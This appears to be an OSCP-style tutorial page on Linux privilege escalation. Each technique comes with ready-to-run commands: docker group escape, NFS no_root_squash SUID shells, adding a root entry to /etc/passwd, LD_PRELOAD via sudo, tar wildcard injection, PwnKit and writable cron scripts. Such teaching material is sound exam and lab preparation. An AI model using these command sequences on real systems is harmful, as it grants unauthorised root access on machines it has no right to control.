  - generic [ref=f1e126]:
    - generic [ref=f1e127]: Order matters — don't reach for the kernel first
    - text: "Work cheap-and-safe before risky:"
    - strong [ref=f1e128]: sudo -l and stray creds → SUID / SGID / capabilities / cron → group / NFS / PATH → kernel and pkexec last
    - text: . A kernel exploit can panic the box and cost you the machine (and exam time); a memory-corruption local root like PwnKit is more reliable but still a real exploit, so try the misconfigurations first. Most OSCP boxes fall to a config mistake, not a CVE.
  - heading "More paths to root — the exact moves" [level=2] [ref=f1e129]
  - paragraph [ref=f1e130]:
    - text: The table is the map; here are the commands for the vectors a software engineer hasn't usually seen before. Each one is a
    - strong [ref=f1e131]: misconfiguration
    - text: ", not a memory bug, so they're reliable and exam-safe."
  - heading "Dangerous group membership (docker / lxd / disk)" [level=3] [ref=f1e132]
  - paragraph [ref=f1e133]:
    - text: Some groups are
    - emphasis [ref=f1e134]: root by design
    - text: . If
    - code [ref=f1e135]: id
    - text: "puts you in one, you're effectively done:"
  - generic [ref=f1e136]: "# docker group: run a container that bind-mounts the host root, then chroot in $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh # id uid=0(root) gid=0(root) # disk group: raw read/write to the disk device — read shadow without being root $ debugfs /dev/sda1 debugfs: cat /etc/shadow"
  - paragraph [ref=f1e137]:
    - text: The
    - code [ref=f1e138]: lxd
    - text: /
    - code [ref=f1e139]: lxc
    - text: "group is the same idea: import a tiny image, launch a"
    - code [ref=f1e140]: security.privileged=true
    - text: container, mount the host's
    - code [ref=f1e141]: /
    - text: inside it, and read or write root-owned files. Whenever you see one of these groups, stop and take the gift — it's worth the full 10 points.
  - heading "NFS — no_root_squash" [level=3] [ref=f1e142]:
    - text: NFS —
    - code [ref=f1e143]: no_root_squash
  - paragraph [ref=f1e144]:
    - text: By default NFS "squashes" a remote root down to
    - code [ref=f1e145]: nobody
    - text: . With
    - code [ref=f1e146]: no_root_squash
    - text: ", a file you create as root"
    - emphasis [ref=f1e147]: over the share
    - text: "stays root-owned on the target. So craft a SUID-root shell from your attacker box and run it on the target:"
  - generic [ref=f1e148]: "# on the target — find the misconfigured export $ cat /etc/exports /srv/share *(rw,no_root_squash) # on YOUR attacker box (as root) — mount it and plant a SUID shell # mount -o rw 10.10.10.5:/srv/share /mnt # printf 'int main(){setgid(0);setuid(0);system(\"/bin/bash\");}' > /mnt/r.c # gcc /mnt/r.c -o /mnt/rootsh && chmod +s /mnt/rootsh # back on the target — the binary is root-owned and SUID $ /srv/share/rootsh # id uid=0(root) gid=0(root)"
  - paragraph [ref=f1e149]: Compile statically (or on the target) if the target's libc differs from your attacker box.
  - heading "Writable /etc/passwd — add your own root" [level=3] [ref=f1e150]:
    - text: Writable
    - code [ref=f1e151]: /etc/passwd
    - text: — add your own root
  - paragraph [ref=f1e152]:
    - text: If
    - code [ref=f1e153]: /etc/passwd
    - text: "is writable, you don't need to crack anyone — just add a second UID-0 account with a password you choose:"
  - generic [ref=f1e154]: "$ openssl passwd -1 -salt xy hunter2 # make a crypt(3) hash $1$xy$8b1.../ $ echo 'pwn:$1$xy$8b1.../:0:0:root:/root:/bin/bash' >> /etc/passwd $ su pwn # password: hunter2 # id uid=0(root) gid=0(root)"
  - paragraph [ref=f1e155]:
    - text: The historical
    - code [ref=f1e156]: x
    - text: in the password field means "look in
    - code [ref=f1e157]: /etc/shadow
    - text: "\"; put a real hash there instead and the system trusts it. Adding an account is quieter than touching the existing"
    - code [ref=f1e158]: root
    - text: line — leave the real one alone.
  - heading "LD_PRELOAD / LD_LIBRARY_PATH via sudo env_keep" [level=3] [ref=f1e159]:
    - code [ref=f1e160]: LD_PRELOAD
    - text: /
    - code [ref=f1e161]: LD_LIBRARY_PATH
    - text: via sudo
    - code [ref=f1e162]: env_keep
  - paragraph [ref=f1e163]:
    - text: If
    - code [ref=f1e164]: sudo -l
    - text: shows
    - code [ref=f1e165]: env_keep+=LD_PRELOAD
    - text: (or
    - code [ref=f1e166]: LD_LIBRARY_PATH
    - text: ), sudo will carry that variable into the elevated command. The dynamic loader honours
    - code [ref=f1e167]: LD_PRELOAD
    - text: "for SUID-aware contexts here, so a shared object with a constructor runs as root:"
  - generic [ref=f1e168]: "$ sudo -l env_keep+=LD_PRELOAD, (root) NOPASSWD: /usr/sbin/apache2ctl $ cat > /tmp/x.c <<'EOF' #include <stdlib.h> void _init(){ setgid(0); setuid(0); system(\"/bin/bash\"); } EOF $ gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c $ sudo LD_PRELOAD=/tmp/x.so /usr/sbin/apache2ctl # id uid=0(root) gid=0(root)"
  - paragraph [ref=f1e169]:
    - text: The command you target is irrelevant — the loader runs your
    - code [ref=f1e170]: .so
    - text: first, before
    - code [ref=f1e171]: apache2ctl
    - text: ever does anything.
  - heading "Wildcard injection (tar / chown / rsync)" [level=3] [ref=f1e172]
  - paragraph [ref=f1e173]:
    - text: When a root script runs a command with a bare
    - code [ref=f1e174]: "*"
    - text: in a directory you can write to, the shell expands
    - code [ref=f1e175]: "*"
    - text: to your filenames — and many tools read filenames that start with
    - code [ref=f1e176]: "-"
    - text: as
    - strong [ref=f1e177]: options
    - text: . Name a file after a dangerous flag and you've injected an argument. Classic
    - code [ref=f1e178]: tar
    - text: "checkpoint trick:"
  - generic [ref=f1e179]: "# root cron runs: cd /opt/backups && tar czf /root/bk.tgz * $ cd /opt/backups $ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > x.sh $ echo '' > '--checkpoint=1' $ echo '' > '--checkpoint-action=exec=sh x.sh' # next run: tar treats the filenames as flags and executes x.sh as root $ /tmp/rootbash -p # id euid=0(root)"
  - paragraph [ref=f1e180]:
    - text: The same shape works for
    - code [ref=f1e181]: chown --reference=…
    - text: and
    - code [ref=f1e182]: rsync -e …
    - text: . Whenever a privileged job globs files in your directory, you control its arguments.
  - heading "pkexec / Polkit — PwnKit (CVE-2021-4034)" [level=3] [ref=f1e183]
  - paragraph [ref=f1e184]:
    - text: "One near-universal fallback:"
    - strong [ref=f1e185]: PwnKit
    - text: . The SUID
    - code [ref=f1e186]: pkexec
    - text: binary shipped on virtually every major distro and, before the January 2022 patch, a memory-corruption bug gave local root
    - emphasis [ref=f1e187]: regardless of sudo or group config
    - text: ". Confirm and fire:"
  - generic [ref=f1e188]: "$ ls -l /usr/bin/pkexec -rwsr-xr-x 1 root root ... /usr/bin/pkexec # SUID set = candidate $ ./PwnKit # prebuilt exploit (one binary, no args) # id uid=0(root) gid=0(root)"
  - paragraph [ref=f1e189]:
    - text: It's reliable, but it
    - emphasis [ref=f1e190]: is
    - text: an exploit, not a misconfiguration — so it sits near the bottom of your order, just above a kernel CVE. Great when an old box has no obvious misconfig; never your first move.
  - heading "Worked example — sudo to root in one line" [level=2] [ref=f1e191]
  - paragraph [ref=f1e192]:
    - text: The single most common OSCP Linux privesc.
    - code [ref=f1e193]: sudo -l
    - text: "returns:"
  - generic [ref=f1e194]: "User www-data may run the following commands on host: (root) NOPASSWD: /usr/bin/find"
  - paragraph [ref=f1e195]:
    - link "GTFOBins → find" [ref=f1e196] [cursor=pointer]:
      - /url: https://gtfobins.github.io/gtfobins/find/
    - text: tells you
    - code [ref=f1e197]: find
    - text: can run a command via
    - code [ref=f1e198]: "-exec"
    - text: ". So:"
  - generic [ref=f1e199]: "$ sudo find . -exec /bin/sh \\; -quit # id uid=0(root) gid=0(root) groups=0(root) # cat /root/proof.txt"
  - paragraph [ref=f1e200]:
    - text: "Root. Grab the proof file — that's the second 10 points. The pattern generalises:"
    - emphasis [ref=f1e201]: find what you're allowed to run, then make it run a shell.
  - heading "Worked example 2 — writable root cron → /bin/bash -p" [level=2] [ref=f1e202]:
    - text: Worked example 2 — writable root cron →
    - code [ref=f1e203]: /bin/bash -p
  - paragraph [ref=f1e204]: "No sudo rights this time. LinPEAS flags a cron entry that runs as root, and the script it calls is world-writable — a permission mistake, not a vulnerability:"
  - generic [ref=f1e205]: "$ cat /etc/crontab * * * * * root /usr/local/bin/backup.sh $ ls -l /usr/local/bin/backup.sh -rwxrwxrwx 1 root root 184 backup.sh # anyone can write it"
  - paragraph [ref=f1e206]:
    - text: Append a line that makes
    - code [ref=f1e207]: bash
    - text: itself SUID-root, then wait one tick and launch it with
    - code [ref=f1e208]: "-p"
    - text: "(which keeps the elevated euid instead of dropping it):"
  - generic [ref=f1e209]: "$ echo 'chmod +s /bin/bash' >> /usr/local/bin/backup.sh # ...wait up to 60s for the next cron run... $ ls -l /bin/bash -rwsr-sr-x 1 root root ... /bin/bash $ /bin/bash -p bash-5.1# id uid=33(www-data) euid=0(root) gid=33(www-data) egid=0(root)"
  - paragraph [ref=f1e210]:
    - text: "Same lesson as the sudo example:"
    - emphasis [ref=f1e211]: find something root runs, then make it run your code.
    - text: Two boxes, two vectors, identical mindset.
  - heading "Your enumeration order — a recap" [level=2] [ref=f1e212]
  - paragraph [ref=f1e213]: When you land on a fresh box, walk this priority list top to bottom. Cheap and safe first; the things that can break the box are last.
  - list [ref=f1e214]:
    - listitem [ref=f1e215]:
      - strong [ref=f1e216]: Stabilise your shell
      - text: (TTY upgrade), then
      - code [ref=f1e217]: sudo -l
      - text: and a sweep for
      - strong [ref=f1e218]: stray credentials
      - text: (configs, history,
      - code [ref=f1e219]: .ssh
      - text: ", DB strings). The cheapest wins live here."
    - listitem [ref=f1e220]:
      - strong [ref=f1e221]: SUID / SGID binaries, capabilities, and writable cron
      - text: —
      - code [ref=f1e222]: find / -perm -4000
      - text: ","
      - code [ref=f1e223]: getcap -r /
      - text: ", and any root job you can edit. Check each against"
      - link "GTFOBins" [ref=f1e224] [cursor=pointer]:
        - /url: https://gtfobins.github.io/
      - text: .
    - listitem [ref=f1e225]:
      - strong [ref=f1e226]: Group membership, NFS exports, and writable PATH
      - text: —
      - code [ref=f1e227]: id
      - text: for
      - code [ref=f1e228]: docker
      - text: /
      - code [ref=f1e229]: lxd
      - text: /
      - code [ref=f1e230]: disk
      - text: ","
      - code [ref=f1e231]: /etc/exports
      - text: for
      - code [ref=f1e232]: no_root_squash
      - text: ", and any script calling a binary by relative name."
    - listitem [ref=f1e233]:
      - strong [ref=f1e234]: Kernel exploit and pkexec/PwnKit — last.
      - text: Only when the misconfigurations are exhausted, because they're real exploits that can crash or are noisy.
  - heading "Check yourself" [level=2] [ref=f1e235]
  - paragraph [ref=f1e236]: Pick the best move. Retrieve before reasoning — feedback below each.
